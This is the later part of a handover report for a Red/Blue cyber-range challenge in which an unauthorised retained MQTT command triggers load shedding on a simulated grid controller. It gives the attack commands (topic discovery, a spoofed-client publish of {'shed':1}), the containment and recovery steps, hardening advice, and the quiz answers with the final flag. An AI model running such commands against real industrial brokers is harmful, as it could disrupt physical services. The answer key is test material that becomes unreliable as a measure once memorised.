The collector walks every evidence file except the manifest itself, sorts the paths, calculates SHA-256, and writes SHA256SUMS inside the case directory. Verification is performed from the evidence directory with sha256sum -c SHA256SUMS.

cd /var/log/otlab/mqtt-retained-demand-response/evidence/\<UTC-STAMP\>\
sudo sha256sum -c SHA256SUMS

## 13.4 Chain-of-custody minimums

- Case identifier and evidence-directory path.

- UTC collection time and analyst identity.

- Source host, operating system, and challenge module.

- Commands executed and collection errors, if any.

- SHA-256 manifest verification result.

- Location and hash of exported PCAP/PCAPNG and screenshots.

- Containment time recorded after preservation completed.

# 14. Containment

## 14.1 Stop command consumption

sudo systemctl stop mqtt-dr-controller.service

Stopping the controller prevents it from immediately consuming another retained command while Blue changes broker state.

## 14.2 Clear the malicious retained value

mosquitto_pub \\\
-h 127.0.0.1 \\\
-p 1883 \\\
-i zone3-blue-containment \\\
-q 1 \\\
-r \\\
-n \\\
-t 'grid/dr/zone3/cmd'

In MQTT, publishing a zero-length retained message removes the retained value for the topic.

## 14.3 Confirm removal

timeout 3 mosquitto_sub \\\
-h 127.0.0.1 \\\
-p 1883 \\\
-t 'grid/dr/zone3/cmd' \\\
-C 1 \\\
-v

The validated command timed out with no immediate {"shed":1} response.

## 14.4 Network containment

At the boundary, restrict TCP/1883 to authorized participant or application networks. Preserve the original source address as an indicator before modifying firewall or cloud security-group rules. Avoid broad firewall changes that could interrupt SSH management or unrelated services.

## 14.5 Containment success conditions

- Evidence preserved before retained state is changed.

- Controller stopped during retained-state modification.

- Malicious retained message no longer returned.

- Unapproved external publish access restricted.

- Broker and HMI remain available to authorized users.

# 15. Recovery, Reset, and Service Availability

## 15.1 Establish the approved safe state

mosquitto_pub \\\
-h 127.0.0.1 \\\
-p 1883 \\\
-i zone3-blue-recovery \\\
-q 1 \\\
-r \\\
-t 'grid/dr/zone3/cmd' \\\
-m '{"shed":0}'

## 15.2 Start the controller

sudo systemctl start mqtt-dr-controller.service

## 15.3 Validate recovery

curl -s http://127.0.0.1:8090/api/status \| jq '{\
controller_online,\
grid_condition,\
baseline_load_mw,\
served_load_mw,\
load_reduction_mw,\
shed_active,\
authorized_shed\
}'

| **Field**         | **Expected Safe Value**   |
|-------------------|---------------------------|
| controller_online | true during online window |
| grid_condition    | NORMAL                    |
| baseline_load_mw  | 80                        |
| served_load_mw    | 80                        |
| load_reduction_mw | 0                         |
| shed_active       | false                     |
| authorized_shed   | false                     |

## 15.4 Packaged reset

sudo ./reset.sh

The reset publishes the safe retained value on the internal broker, rewrites controller-request.json with a safe reset request, waits for grid truth to become NORMAL / 80 MW / shed=false, and prints RESET_SUCCESS.

## 15.5 Final service availability

for s in mqtt-dr-broker mqtt-dr-grid-simulator mqtt-dr-controller \\\
mqtt-dr-telemetry mqtt-dr-audit mqtt-dr-hmi mqtt-dr-capture; do\
systemctl is-active --quiet "\$s" \|\| exit 1\
done\
echo "MQTT_SERVICE_AVAILABILITY=PASS"

The validated final output was MQTT_SERVICE_AVAILABILITY=PASS.

# 16. TTP Mapping

| **TTP File** | **ID** | **Purpose** | **Command Behavior** |
|----|----|----|----|
| Setup-TTP.yml | OT-MQTT-Retained-DR-Setup | Confirms challenge setup | Prints exactly Setup Successfully |
| Attack-TTP.yml | OT-MQTT-Retained-DR-Unauthorized-Command | Seeds unauthorized retained command | Publishes {"shed":1} with contractor-laptop-07, QoS 1, retain |
| Service-Availability-TTP.yml | OT-MQTT-Retained-DR-Service-Availability | Validates runtime availability | Checks seven services, ports 1883/1884/8090, MQTT delivery, HMI API |

## 16.1 Attack TTP metadata

id: OT-MQTT-Retained-DR-Unauthorized-Command\
name: OT-MQTT-Retained-DR-Unauthorized-Command\
tactic: impair-process-control\
technique_id: T1692.001\
technique_name: Unauthorized Message - Command Message

## 16.2 Facilitator controls

- Run the attack only against the authorized challenge target.

- Do not expose the Attack TTP to Red participants before the exercise.

- Use the Blue Attack TTP only for standalone Blue incident seeding.

- Run service availability before participant access and after reset.

- Preserve evidence before containment or recovery.

# 17. Assessment and Reporting Mapping

## 17.1 Red assessment

| **Question Type** | **Validated Focus**                                |
|-------------------|----------------------------------------------------|
| MCQ 1             | Participant-facing protocol on TCP/1883 â€” MQTT     |
| MCQ 2             | Property that persists the command â€” retained flag |
| MCQ 3             | Packaged ICS technique mapping â€” T1692.001         |
| Fill 1            | Incident served load â€” 52 MW                       |
| Fill 2            | Final flag â€” flag{52mw_28mw_shed_1}                |

Total: 5 marks. Passing score: 4. The final flag question must be correct.

## 17.2 Blue assessment

| **Question Type** | **Validated Focus**                                   |
|-------------------|-------------------------------------------------------|
| MCQ 1             | Correlated alert file â€” retained-command-alerts.jsonl |
| MCQ 2             | Unauthorized publisher â€” contractor-laptop-07         |
| MCQ 3             | Persistence property â€” retained flag                  |
| Fill 1            | Malicious payload â€” {"shed":1}                        |
| Fill 2            | Final flag â€” flag{52mw_28mw_shed_1}                   |

Total: 5 marks. Passing score: 4. The final flag question must be correct.

## 17.3 Assessment handling

- Participant-facing sheets contain the questions and answer-entry fields.

- Author Key sheets are facilitator-controlled and must not be distributed to participants.

- Red and Blue assessments use the same validated challenge findings but test different role knowledge.

- The Red-vs-Blue module contains both role-specific workbooks.

## 17.4 Reporting templates

| **Template** | **Use** |
|----|----|
| INREP.md | Initial notification: time, reporter, affected asset, observed impact, immediate action |
| SITREP.md | Periodic operational situation report: status, evidence, decisions, risks, next actions |
| RED-REPORT.md | Red attack narrative, commands, packet evidence, process impact, findings, remediation |

# 18. Security Recommendations

| **Priority** | **Recommendation** | **Expected Control Effect** |
|----|----|----|
| Critical | Disable anonymous MQTT access and require authenticated clients | Prevents arbitrary external connections |
| Critical | Remove public write permission to grid/dr/zone3/cmd | Eliminates the exposed control path |
| Critical | Use TLS/mTLS with certificate-bound client identity | Prevents client-ID spoofing and protects confidentiality/integrity |
| High | Separate telemetry and control brokers or trust zones | Reduces cross-zone impact and retained-state sharing |
| High | Authorize command topics by service account and source network | Enforces least privilege |
| High | Sign commands and validate timestamp, nonce, sequence and expiry | Rejects replayed or stale retained instructions |
| High | Reject retained messages for safety-critical command topics unless explicitly required | Removes persistence risk |
| High | Alert on external publishes, retain=true, command payload changes and new client IDs | Improves detection |
| Medium | Maintain broker persistence backups and retained-topic inventory | Supports investigation and controlled recovery |
| Medium | Test safe-state recovery and controller reconnect behavior regularly | Reduces operational recovery risk |

## 18.1 Suggested hardened public ACL

\# Public listener: telemetry read only\
topic read grid/dr/zone3/telemetry\
topic read grid/dr/zone3/controller/status\
topic read grid/dr/zone3/process/state\
\
\# No public write to grid/dr/zone3/cmd

## 18.2 Monitoring recommendations

- Collect Mosquitto connection and publish logs centrally.

- Parse client ID, source IP, source port, topic, QoS, retained status, message size, and time.

- Correlate broker events with controller receipt and physical-process truth.

- Treat unexpected retained command changes as high severity.

- Preserve the retained database and packet capture before clearing state.

# 19. Known Limitations and Operational Notes

| **Item** | **Disclosure** |
|----|----|
| Process model | Electrical demand response and grid load are simulated; MQTT, Mosquitto persistence, network traffic, systemd services, evidence, and response actions are genuine. |
| Controller cycle | The controller intentionally alternates 25 seconds online and 15 seconds offline. |
| NAT attribution | The server may record a NAT or gateway address rather than the workstation-local address. |
| Client identity | MQTT client IDs are visible evidence but are spoofable without authentication. |
| Public listener | Anonymous read/write access is intentionally vulnerable for the exercise. |
| HMI | The monitoring interface is a challenge status API, not a vendor production HMI. |
| Internal listener | TCP/1884 is localhost-only and should not be exposed externally. |
| Module deployment | Only one module should be installed per VM due shared paths, ports and unit names. |
| Screenshot evidence | Screenshots support the report but the PCAP/PCAPNG and native logs remain the primary evidence. |
| Freshness | Target IP 203.0.0.161 was temporary validation infrastructure and should be replaced with the deployment-assigned address. |

## 19.1 Acceptance risk interpretation

The package passed the tested scenario. The remaining operational risk is environmental: cloud firewall rules, SSH permissions, and target network paths must permit only the intended participant flows. The final recipient should perform a short service-availability check after deployment in the destination environment.

# 20. Module-by-Module Package Contents

## 20.1 Red Module

- challenge-core/ â€” shared validated runtime

- Description.md â€” black-box mission

- Red-Writeup.md â€” facilitator solution

- Assessment.xlsx â€” Red questions and author key

- attack.sh â€” optional authorized automation

- README-CREATOR.md and BUILD-VALIDATION.md

- deps.sh, setup.sh, reset.sh

- ttp/Setup-TTP.yml and ttp/Attack-TTP.yml

- PACKAGE.sha256

## 20.2 Blue Module

- challenge-core/ â€” shared validated runtime

- Description.md â€” Blue mission

- Blue-Writeup.md â€” investigation and recovery solution

- Assessment.xlsx â€” Blue questions and author key

- Red-Team-Attack-Script.sh â€” facilitator incident seeding

- collect-evidence.sh â€” evidence wrapper

- README-CREATOR.md and BUILD-VALIDATION.md

- deps.sh, setup.sh, reset.sh

- ttp/Setup-TTP.yml, Attack-TTP.yml, and Service-Availability-TTP.yml

- PACKAGE.sha256

## 20.3 Red-vs-Blue Module

- challenge-core/ â€” shared validated runtime

- README.md and Description.md â€” concurrent exercise instructions

- Red-Writeup.md and Blue-Writeup.md

- Red-Assessment.xlsx and Blue-Assessment.xlsx

- Red-Team-Attack-Script.sh and collect-evidence.sh

- INREP.md, SITREP.md, and RED-REPORT.md

- README-CREATOR.md and BUILD-VALIDATION.md

- deps.sh, setup.sh, reset.sh

- ttp/Setup-TTP.yml, Attack-TTP.yml, and Service-Availability-TTP.yml

- PACKAGE.sha256

## 20.4 Outer package

- Three independently deployable module ZIPs and individual SHA-256 sidecars.

- README.md with validation and distribution guidance.

- This standalone complete technical and non-technical Word report.

- COMPLETE-PACKAGE.sha256 covering the entire outer-package contents.

# 21. Operator Quick Reference and Troubleshooting

## 21.1 Install selected module

cd MQTT-Retained-Demand-Response-\<Selected\>-Module\
sudo ./setup.sh

## 21.2 Check status

systemctl is-active mqtt-dr-lab.target\
sudo ss -lntp \| grep -E ':1883\|:1884\|:8090'\
curl -s http://127.0.0.1:8090/api/status \| jq .

## 21.3 Collect evidence

sudo ./collect-evidence.sh

## 21.4 Reset

sudo ./reset.sh

## 21.5 Common issues

| **Symptom** | **Likely Cause** | **Corrective Action** |
|----|----|----|
| No packets in local WSL Wireshark | WSL capture permissions/interface limitations | Use Windows Wireshark SSH remote capture with sshdump |
| sshdump authentication failure | Unsupported/unauthorized private key or stale host key | Use a dedicated RSA PEM key, authorize it, verify host fingerprint |
| Permission denied running remote capture | tcpdump requires sudo | Allow only /usr/bin/tcpdump via a narrow NOPASSWD sudoers entry |
| controller_online=false after recovery | Check occurred during intentional offline window | Wait for the next online window; verify process remains NORMAL / 80 MW |
| Default nmap misses TCP/1883 | Fast/default scan behavior or network timing | Run nmap -Pn -sT -p 1883,8090 --reason |
| Retained malicious value reappears | Malicious retained state was not cleared | Stop controller, publish zero-length retained message, verify absence |
| setup fails to bind ports | Another module or service is already installed | Use one module per VM; identify conflicts before cleanup |


**Non-destructive operating rule

**Do not reboot, remove K3s, broadly alter firewall rules, or delete system runtime directories as a first troubleshooting step. Prefer service status, logs, listener checks, exact file validation, and reversible targeted changes.


# 22. Final Acceptance Matrix

| **Acceptance Requirement** | **Evidence** | **Result** |
|----|----|----|
| Package integrity | Outer and nested sha256sum -c returned 0 | PASS |
| Clean supported host | Ubuntu 22.04.5 LTS x86_64 preflight | PASS |
| Original setup entry point | sudo ./setup.sh â†’ SETUP_SUCCESS | PASS |
| Real OT protocol software | Eclipse Mosquitto + mosquitto clients | PASS |
| Public participant path | External MQTT subscription/publish on TCP/1883 | PASS |
| Safe baseline | NORMAL / 80 MW / {"shed":0} | PASS |
| Real retained attack | QoS 1, retain=true, {"shed":1} | PASS |
| Controller delayed execution | Command executed after reconnect | PASS |
| Operational impact | 52 MW served, 28 MW reduction | PASS |
| Blue detection | HIGH correlated alert | PASS |
| Attribution | client ID, source address/port, topic, payload, QoS, retain | PASS |
| Network evidence | Windows Wireshark SSH remote capture | PASS |
| Evidence preservation | Timestamped collection and SHA-256 manifest | PASS |
| Containment | Malicious retained message cleared | PASS |
| Recovery | Safe {"shed":0}; NORMAL / 80 MW | PASS |
| Packaged reset | RESET_SUCCESS | PASS |
| Final services | All seven services active | PASS |
| Three-module linkage | Identical common core and wrappers | PASS |
| Standalone handover report | This document inserted at package root | PASS |


**Overall status

**READY FOR HANDOVER â€” the original challenge runtime was manually validated from setup through attack, detection, preservation, containment, recovery, reset, and final availability. This report completes the standalone documentation requirement.


# Appendix A â€” Exact Validated Commands

## A.1 Red baseline and topic discovery

TARGET="TARGET_IP"\
curl -s "http://\$TARGET:8090/api/status" \| jq .\
timeout 12s mosquitto_sub -h "\$TARGET" -p 1883 -t '#' -v

## A.2 Red retained command

mosquitto_pub -h "\$TARGET" -p 1883 \\\
-i contractor-laptop-07 -q 1 -r \\\
-t 'grid/dr/zone3/cmd' -m '{"shed":1}'\
\
timeout 5 mosquitto_sub -h "\$TARGET" -p 1883 \\\
-i retained-command-check -t 'grid/dr/zone3/cmd' -C 1 -v

## A.3 Blue alert and execution evidence

sudo tail -n 1 /var/log/otlab/mqtt-retained-demand-response/retained-command-alerts.jsonl \| jq .\
sudo tail -n 5 /var/log/otlab/mqtt-retained-demand-response/controller.jsonl \| jq .\
sudo tail -n 5 /var/log/otlab/mqtt-retained-demand-response/execution-timeline.jsonl \| jq .\
sudo grep -E 'contractor-laptop-07\|grid/dr/zone3/cmd' \\\
/var/log/otlab/mqtt-retained-demand-response/mosquitto.log \| tail -n 20

## A.4 Preserve, contain, recover

sudo ./collect-evidence.sh\
sudo systemctl stop mqtt-dr-controller.service\
mosquitto_pub -h 127.0.0.1 -p 1883 -i zone3-blue-containment \\\
-q 1 -r -n -t 'grid/dr/zone3/cmd'\
timeout 3 mosquitto_sub -h 127.0.0.1 -p 1883 \\\
-t 'grid/dr/zone3/cmd' -C 1 -v\
mosquitto_pub -h 127.0.0.1 -p 1883 -i zone3-blue-recovery \\\
-q 1 -r -t 'grid/dr/zone3/cmd' -m '{"shed":0}'\
sudo systemctl start mqtt-dr-controller.service\
sudo ./reset.sh

## A.5 Windows Wireshark SSH remote capture

Remote host: TARGET_IP\
SSH port: 22\
Username: ubuntu\
Private key: dedicated authorized RSA/PEM key\
Remote interface: any\
Capture command: tcpdump\
Privilege: sudo\
Capture filter: tcp port 1883\
Display filter: mqtt && tcp.port == 1883

# Appendix B â€” Hashes and Package Integrity

| **Artifact** | **SHA-256** |
|----|----|
| Original outer ZIP | 8c6ac557675eeb8f2f2b5d6df04746916d9c9e308d3efb8545c1dd2787fad093 |
| Red Module ZIP | 4fb3a7249f555eecae43d3e3ec921ab294ff84c8dbc08e5b1097de4fc518a406 |
| Blue Module ZIP | 41afca2213eeed49d5f219e20fcd9548a459fe1c2ad15091909823475f91477b |
| Red-vs-Blue Module ZIP | ad1c2c55107b9de65795bdc8371c81e8ae92758dd9bebad73f2dd1fb8c443813 |
| Common challenge-core tree | 36d6c0aac9c8829c0710f540c06952a93d8bb5e2321d4a2e0be9f16fe6541fb3 |
| setup.sh wrapper | 3cba500e2c2719d3ae04bf241e5daeeebc0d75e1f04e5cd53ba814ff25810181 |
| deps.sh wrapper | 7aa8b570087085e23ea67501b3f52f694e34f0376423941a48dd079b2370d1e7 |
| reset.sh wrapper | a02937c8ce27a3f7b6c8f223705eb88ee619cdcd40100639a8f51a222ce19bac |

## B.1 Integrity commands

sha256sum MQTT-Retained-Demand-Response.zip\
sha256sum -c COMPLETE-PACKAGE.sha256\
sha256sum -c PACKAGE.sha256

The final package produced with this report contains a regenerated COMPLETE-PACKAGE.sha256 manifest so the added Word report and its sidecar are covered by integrity verification.

# Appendix C â€” Validated Evidence Values

| **Evidence Item** | **Validated Value** |
|----|----|
| Site | Regional Grid Operations |
| Zone | ZONE-3 |
| Asset | GRID-DR-ZONE3 |
| Normal state | NORMAL |
| Normal served load | 80 MW |
| Malicious state | LOAD_SHEDDING_ACTIVE |
| Incident served load | 52 MW |
| Reduction | 28 MW |
| Malicious topic | grid/dr/zone3/cmd |
| Malicious payload | {"shed":1} |
| Safe payload | {"shed":0} |
| Publisher client ID | contractor-laptop-07 |
| Controller client ID | zone3-dr-controller |
| QoS | 1 |
| Retained | true |
| Authorization during incident | false |
| Alert severity | HIGH |
| Server-observed source | 172.24.4.1:52658 |
| Evidence collection path | /var/log/otlab/mqtt-retained-demand-response/evidence/20260721T185008Z |
| Final flag | flag{52mw_28mw_shed_1} |

**End of Report**

